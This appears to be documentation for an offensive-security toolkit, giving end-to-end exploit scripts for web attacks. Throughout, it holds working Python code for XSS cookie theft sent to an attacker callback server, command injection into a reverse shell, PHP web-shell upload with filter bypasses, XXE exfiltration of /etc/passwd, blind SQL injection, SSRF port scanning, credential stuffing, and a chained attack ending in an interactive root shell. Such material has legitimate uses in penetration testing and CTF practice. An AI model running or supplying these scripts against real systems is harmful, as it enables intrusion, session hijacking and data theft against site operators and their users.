Workflows
=========

End-to-end POC workflows for common exploitation scenarios.

XSS Cookie Stealer
------------------

Complete workflow for stealing cookies via XSS.

**Setup:**

Start the HTTP callback server first:

.. code-block:: bash

   uv run your_project --server

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.xss import cookie_stealer
   from your_project.utils.server_hooks import get_cookie
   from your_project.utils.cookie import parse_cookie_string

   def run(args):
       """Steal admin cookie via stored XSS"""

       target = args.target
       lhost = args.lhost
       lport = args.lport

       # Generate XSS payload
       payload = cookie_stealer(f"http://{lhost}:{lport}")
       out.info(f"Payload: {payload}")

       # Send payload to vulnerable endpoint
       out.status("Injecting XSS payload...")
       r = requests.post(
           f"{target}/comment",
           data={"content": payload},
           allow_redirects=False
       )

       if r.status_code == 302:
           out.success("Payload injected successfully")

       # Wait for admin to visit and trigger callback
       out.status("Waiting for admin to view comment...")
       cookie_str = get_cookie(timeout=60)

       if not cookie_str:
           out.error("No callback received - admin may not have visited")
           return False

       out.success(f"Cookie captured: {cookie_str}")

       # Parse and use stolen cookie
       cookies = parse_cookie_string(cookie_str)

       # Access admin panel
       out.status("Accessing admin panel with stolen cookie...")
       r = requests.get(f"{target}/admin", cookies=cookies)

       if "Admin Panel" in r.text or r.status_code == 200:
           out.success("Successfully accessed admin panel!")
           return True
       else:
           out.error("Cookie didn't grant admin access")
           return False

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local --lhost 10.10.14.5

RCE to Interactive Shell
-------------------------

From command injection to full PTY shell.

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.reverse_shells import python_oneliner, bash_shell
   from your_project.utils.shell_catcher import auto_shell

   def run(args):
       """Exploit RCE and get interactive shell"""

       target = args.target
       lhost = args.lhost
       lport = args.lport

       # Generate shell payload
       cmd = python_oneliner(lhost, lport)
       out.info(f"Payload: {cmd}")

       # Catch shell automatically
       with auto_shell(lport) as catcher:
           # Trigger RCE
           out.status("Triggering RCE...")
           r = requests.post(
               f"{target}/api/run",
               json={"command": cmd},
               timeout=5
           )

           # Wait for shell
           out.status(f"Waiting for shell on port {lport}...")

           # Automatically upgrades to PTY and gives interactive shell
           if catcher.shell_caught:
               out.success("Shell caught!")
               catcher.stabilize()  # Upgrade to PTY
               out.info("Shell stabilized. Entering interactive mode...")
               catcher.interact()   # Full interactive shell!
           else:
               out.error("No shell received")

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local --lhost 10.10.14.5 --lport 4444

File Upload to RCE
------------------

Upload malicious file and get shell.

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.file_upload import FileUploader
   from your_project.utils.reverse_shells import php_shell
   from your_project.utils.shell_catcher import quick_catch

   def run(args):
       """Upload PHP shell and execute it"""

       target = args.target
       lhost = args.lhost
       lport = args.lport

       # Generate PHP reverse shell
       shell_path = php_shell(lhost, lport)
       out.info(f"Generated shell at: {shell_path}")

       # Read shell content
       with open(f'payloads/{shell_path}', 'rb') as f:
           shell_code = f.read()

       # Upload with bypass techniques
       out.status("Uploading shell...")
       uploader = FileUploader(f"{target}/upload")

       result = uploader.upload_with_bypass(
           "shell.php",
           shell_code,
           techniques=["double_extension", "null_byte"]
       )

       if result.status_code != 200:
           out.error("Upload failed")
           return

       out.success("Shell uploaded!")

       # Trigger execution and catch shell
       def trigger():
           out.status("Triggering shell execution...")
           requests.get(f"{target}/uploads/shell.php", timeout=2)

       quick_catch(lport, trigger_func=trigger)

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local --lhost 10.10.14.5 --lport 4444

XXE Data Exfiltration
---------------------

Read files via XXE.

**Setup:**

Start the HTTP callback server first:

.. code-block:: bash

   uv run your_project --server

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.xxe import quick_test
   from your_project.utils.server_hooks import get_exfil

   def run(args):
       """Exfiltrate /etc/passwd via XXE"""

       target = args.target
       lhost = args.lhost
       lport = args.lport

       # Generate XXE payload (also creates DTD file)
       payload = quick_test(f"http://{lhost}:{lport}", "/etc/passwd")
       out.info("XXE payload generated")

       # Send XXE payload
       out.status("Sending XXE payload...")
       r = requests.post(
           f"{target}/api/parse",
           data=payload,
           headers={"Content-Type": "application/xml"}
       )

       # Wait for exfil callback
       out.status("Waiting for data exfiltration...")
       data = get_exfil(timeout=30)

       if data:
           out.success("Data exfiltrated!")
           out.raw("\\n" + "="*50)
           out.raw(data)
           out.raw("="*50 + "\\n")
           return data
       else:
           out.error("No data received")
           return None

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local --lhost 10.10.14.5

Blind SQL Injection
-------------------

Extract data from blind SQLi.

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   import string
   from your_project.utils.output import out
   from your_project.utils.timing import time_request

   def run(args):
       """Extract database name via boolean-based blind SQLi"""

       target = args.target

       def check_condition(condition):
           """Returns True if condition is true"""
           r = requests.get(
               f"{target}/api/user",
               params={"id": f"1' AND {condition}--"}
           )
           return "Welcome" in r.text

       # Extract database name
       db_name = ""
       charset = string.ascii_lowercase + string.digits + "_"

       out.info("Extracting database name...")

       for pos in range(1, 33):
           found = False
           for char in charset:
               condition = f"SUBSTRING(DATABASE(),{pos},1)='{char}'"

               if check_condition(condition):
                   db_name += char
                   out.status(f"Database: {db_name}")
                   found = True
                   break

           if not found:
               break

       out.success(f"Database name: {db_name}")
       return db_name

   def run_time_based(args):
       """Extract data via time-based blind SQLi"""

       target = args.target

       def check_char(pos, char):
           """Returns True if char at position matches"""
           payload = f"1' AND IF(SUBSTRING(DATABASE(),{pos},1)='{char}',SLEEP(3),0)--"

           def attempt():
               return requests.get(f"{target}/api/user", params={"id": payload}, timeout=10)

           duration = time_request(attempt, payload)
           return duration > 3

       db_name = ""
       charset = string.ascii_lowercase + string.digits + "_"

       out.info("Extracting database name (time-based)...")

       for pos in range(1, 33):
           found = False
           for char in charset:
               if check_char(pos, char):
                   db_name += char
                   out.status(f"Database: {db_name}")
                   found = True
                   break

           if not found:
               break

       out.success(f"Database name: {db_name}")
       return db_name

**Run:**

.. code-block:: bash

   # Boolean-based
   uv run your_project --target http://target.local

   # Time-based (if boolean-based doesn't work)
   uv run your_project --target http://target.local --time-based

SSRF to Internal Access
------------------------

Exploit SSRF to access internal services.

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.batch_request import batch_request_sync, generate_param_payloads
   import httpx

   def run(args):
       """Use SSRF to scan internal network"""

       target = args.target

       # Test SSRF vulnerability
       out.info("Testing SSRF...")
       test_url = "http://127.0.0.1:80"
       r = requests.get(f"{target}/fetch", params={"url": test_url})

       if r.status_code == 200:
           out.success("SSRF confirmed!")
       else:
           out.error("SSRF test failed")
           return

       # Scan internal ports
       out.status("Scanning internal ports...")
       client = httpx.Client()

       base = client.build_request("GET", f"{target}/fetch")

       # Common internal service ports
       ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]
       internal_urls = [f"http://127.0.0.1:{port}" for port in ports]

       results = batch_request_sync(
           base,
           payloads=generate_param_payloads("url", internal_urls),
           validate=lambda r: r.status_code == 200 and len(r.text) > 100,
           concurrency=5
       )

       # Show open ports
       out.info("\\nOpen internal ports:")
       for result in results:
           if result.matched:
               port = result.payload['params']['url'].split(':')[-1]
               out.success(f"Port {port} is open")

       # Try to access internal admin panel
       out.status("\\nTrying internal admin panel...")
       r = requests.get(
           f"{target}/fetch",
           params={"url": "http://127.0.0.1:8080/admin"}
       )

       if "admin" in r.text.lower():
           out.success("Accessed internal admin panel!")
           out.raw(r.text[:500])

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local

Credential Stuffing
-------------------

Test multiple credentials efficiently.

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import httpx
   from your_project.utils.output import out
   from your_project.utils.batch_request import batch_request_sync, generate_json_payloads

   def run(args):
       """Test common credential pairs"""

       target = args.target

       # Common credentials
       creds = [
           {"username": "admin", "password": "admin"},
           {"username": "admin", "password": "password"},
           {"username": "admin", "password": "admin123"},
           {"username": "root", "password": "root"},
           {"username": "administrator", "password": "administrator"},
           {"username": "test", "password": "test"},
       ]

       out.info(f"Testing {len(creds)} credential pairs...")

       client = httpx.Client()
       base = client.build_request(
           "POST",
           f"{target}/api/login",
           json={"username": "", "password": ""}
       )

       # Test all credentials
       results = batch_request_sync(
           base,
           payloads=[{"json": cred} for cred in creds],
           validate=lambda r: r.status_code == 200 and "token" in r.text,
           concurrency=3  # Be gentle with login endpoints
       )

       # Show valid credentials
       for result in results:
           if result.matched:
               creds = result.payload['json']
               out.success(f"Valid creds: {creds['username']}:{creds['password']}")

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local

Complete Exploitation Workflow
-------------------------------

Full exploitation chain.

**Setup:**

Start the HTTP callback server first:

.. code-block:: bash

   uv run your_project --server

**Exploit Code:**

.. code-block:: python

   # src/your_project/exploit.py
   import requests
   from your_project.utils.output import out
   from your_project.utils.html_parser import HTMLParser
   from your_project.utils.xss import cookie_stealer
   from your_project.utils.server_hooks import get_cookie
   from your_project.utils.cookie import parse_cookie_string
   from your_project.utils.file_upload import FileUploader
   from your_project.utils.reverse_shells import php_shell
   from your_project.utils.shell_catcher import auto_shell

   def run(args):
       """Complete exploitation chain"""

       target = args.target
       lhost = args.lhost
       lport = args.lport

       # Stage 1: Reconnaissance
       out.info("Stage 1: Reconnaissance")
       r = requests.get(target)
       parser = HTMLParser.from_response(r)

       # Find forms
       forms = parser.find_forms()
       out.success(f"Found {len(forms)} forms")

       # Find upload endpoint
       upload_form = None
       for form in forms:
           if 'upload' in form.get('action', '').lower():
               upload_form = form
               break

       if not upload_form:
           out.error("No upload form found")
           return

       # Stage 2: XSS to steal admin cookie
       out.info("\\nStage 2: XSS Cookie Theft")
       payload = cookie_stealer(f"http://{lhost}:{lport}")

       requests.post(f"{target}/comment", data={"msg": payload})
       out.status("Waiting for admin...")

       cookie_str = get_cookie(timeout=60)
       if not cookie_str:
           out.error("No cookie received")
           return

       out.success("Cookie captured!")
       cookies = parse_cookie_string(cookie_str)

       # Stage 3: File upload with stolen session
       out.info("\\nStage 3: File Upload")
       shell_path = php_shell(lhost, 4444)

       with open(f'payloads/{shell_path}', 'rb') as f:
           shell_code = f.read()

       uploader = FileUploader(f"{target}/upload")
       result = uploader.upload(
           "shell.php",
           shell_code,
           cookies=cookies
       )

       if result.status_code != 200:
           out.error("Upload failed")
           return

       out.success("Shell uploaded!")

       # Stage 4: Get interactive shell
       out.info("\\nStage 4: Shell Execution")

       with auto_shell(4444) as catcher:
           requests.get(f"{target}/uploads/shell.php", timeout=2)

           if catcher.shell_caught:
               out.success("Root access achieved!")
               catcher.stabilize()
               catcher.interact()

**Run:**

.. code-block:: bash

   uv run your_project --target http://target.local --lhost 10.10.14.5
